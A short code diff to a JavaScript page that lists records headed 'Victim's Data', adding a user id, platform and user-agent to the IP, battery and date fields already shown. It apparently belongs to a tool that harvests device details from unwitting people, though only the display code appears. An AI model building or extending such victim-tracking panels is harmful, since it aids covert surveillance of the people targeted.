@@ -20,10 +20,12 @@ const fetchData = async () => {
 
             html += `
                 <ul> 
-                    <h3>Victim's Data</h3>
+                    <h3>Victim's Data      ${row.uid}</h3>
                     <li>ip: ${row.ip}</li> 
                     <li>battery: ${row.battery_percentage}</li> 
                     <li>date: ${row.date}</li> 
+                    <li>platforn: ${row.platform}</li> 
+                    <li>user-agent: ${row.user_agent}</li> 
                 </ul>`;
         }
 
